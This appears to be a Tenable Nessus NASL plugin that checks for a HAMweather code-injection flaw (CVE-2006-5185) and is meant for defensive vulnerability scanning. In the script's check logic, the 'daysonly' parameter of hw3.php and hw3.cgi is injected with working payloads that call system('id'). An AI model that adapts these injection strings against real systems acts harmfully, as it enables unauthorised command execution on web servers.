#
# (C) Tenable Network Security
#


  desc = "
Synopsis :

The remote web server contains an application that allows execution of
arbitrary code. 

Description :

The remote host is running HAMweather, a weather-forecasting software
application. 

The installed version of HAMweather fails to properly sanitize input
to the 'daysonly' parameter before using it to evaluate PHP or Perl
code.  An unauthenticated attacker can leverage this issue to execute
arbitrary code on the remote host subject to the privileges of the web
server user id. 

See also :

http://www.gulftech.org/?node=research&article_id=00115-09302006
http://support.hamweather.com/viewtopic.php?t=6548

Solution :

Upgrade to HAMweather 3.9.8.2 Perl/ASP or HAMweather 3.9.8.5 PHP or
later. 

Risk factor : 

High / CVSS Base Score : 7 
(AV:R/AC:L/Au:NR/C:P/A:P/I:P/B:N)";


if (description)
{
  script_id(22497);
  script_version("$Revision: 1.2 $");

  script_cve_id("CVE-2006-5185");
  script_bugtraq_id(20311);

  script_name(english:"HAMweather daysonly Arbitrary Code Execution Vulnerability");
  script_summary(english:"Executes arbitrary command via HAMweather");
 
  script_description(english:desc);

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006 Tenable Network Security");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);


# Loop through directories.
if (thorough_tests) extra_dirs = make_list("/weather", "/hw3");
else extra_dirs = make_list();

# Try to exploit the flaw to run a command.
cmd = "id";
# - PHP variant.
http_check_remote_code(
  extra_dirs    : extra_dirs,
  check_request : string("/hw3.php?daysonly=0).system(", cmd, ").("),
  check_result  : "uid=[0-9]+.*gid=[0-9]+.*",
  command       : cmd,
  description   : desc,
  port          : port
);
# - PERL variant.
http_check_remote_code(
  extra_dirs    : extra_dirs,
  check_request : string("/hw3.cgi?daysonly=0).system('", cmd, "').("),
  check_result  : "uid=[0-9]+.*gid=[0-9]+.*",
  command       : cmd,
  description   : desc,
  port          : port
);
# - ASP variant (to be determined).
